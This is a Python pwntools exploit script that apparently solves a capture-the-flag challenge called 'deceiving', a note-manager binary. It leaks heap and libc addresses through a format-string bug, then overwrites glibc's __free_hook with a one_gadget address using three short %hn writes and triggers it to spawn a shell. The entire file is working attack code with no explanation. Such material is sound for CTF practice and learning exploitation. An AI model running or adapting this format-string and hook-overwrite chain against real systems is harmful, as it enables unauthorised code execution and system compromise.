#!/usr/bin/env python3

from pwn import *

elf = ELF("../challenge/deceiving")
libc = ELF("../src/libc.so.6")
ld = ELF("../src/ld-linux-x86-64.so.2")

context.terminal = ['xfce4-terminal', '--tab', '-e']


def conn():
    if args.GDB:
        # r = gdb.debug([elf.path], aslr=False)
        r = gdb.debug([elf.path], aslr=True)
    elif args.LOCAL:
        r = process([elf.path])
    else:
        r = remote("localhost", 1337)
 
    return r

io = conn()

def create_note(Bytes, Name, Note, Color, Index):
    print(io.recvuntil(b"exit\n").decode())
    io.sendline(b"1")
    print(io.recvuntil(b"?\n").decode())
    io.sendline(str(Bytes).encode())
    print(io.recvuntil(b"]\n").decode())
    io.send(Name)
    print(io.recvuntil(b":\n").decode())
    io.sendline(Note)
    print(io.recvuntil(b"Yellow\n").decode())
    io.sendline(str(Color).encode())
    print(io.recvuntil(b":\n").decode())
    io.sendline(str(Index).encode())

def edit_note(Index, Note):
    print(io.recvuntil(b"exit\n").decode())
    io.sendline(b"2")
    print(io.recvuntil(b":\n").decode())
    io.sendline(str(Index).encode())
    print(io.recvuntil(b":\n").decode())
    io.sendline(Note)

def print_note(Index):
    print(io.recvuntil(b"exit\n").decode())
    io.sendline(b"3")
    print(io.recvuntil(b":\n").decode())
    io.sendline(str(Index).encode())
    note = io.recvuntil(b"what")[:-5]
    return note

def delete_note(Index):
    print(io.recvuntil(b"exit\n").decode())
    io.sendline(b"4")
    print(io.recvuntil(b":\n").decode())
    io.sendline(str(Index).encode())

def main():
    create_note(0x50, b"Name\n", b"A" * 0x50, 1, 0)
    name_leak = u64(print_note(0)[11:-4].strip(b"A").ljust(8, b"\x00"))
    log.info(f"Heap leak {hex(name_leak)}")

    buffer = name_leak - 0x68
    format = b"%15$p "
    exploit = format + b"\x00" * (0x50 - len(format)) + p64(name_leak) + p64(buffer)
    edit_note(0, exploit)

    leak_libc = print_note(0)
    libc.address = int(leak_libc, 16) - 0x24083
    one_gadget = libc.address + 0xe3b01
    one_gadget_lsb = one_gadget & 0xffff
    one_gadget_mid = (one_gadget & 0xffff0000) >> 16
    one_gadget_msb = (one_gadget & 0xffff00000000) >> 32

    log.info(f"__free_hook @ {hex(libc.sym['__free_hook'])}")


    format = f"%{one_gadget_lsb}c%3$hn".encode()
    exploit = format + b"\x00" * (0x50 - len(format)) + p64(libc.sym["__free_hook"]) + p64(buffer)
    edit_note(0, exploit)
    print_note(0)

    format = f"%{one_gadget_mid}c%3$hn".encode()
    exploit = format + b"\x00" * (0x50 - len(format)) + p64(libc.sym["__free_hook"] + 2) + p64(buffer)
    edit_note(0, exploit)
    print_note(0)

    format = f"%{one_gadget_msb}c%3$hn".encode()
    exploit = format + b"\x00" * (0x50 - len(format)) + p64(libc.sym["__free_hook"] + 4) + p64(buffer)
    edit_note(0, exploit)
    print_note(0)

    #get you shell:
    delete_note(0)








    io.interactive()


if __name__ == "__main__":
    main()
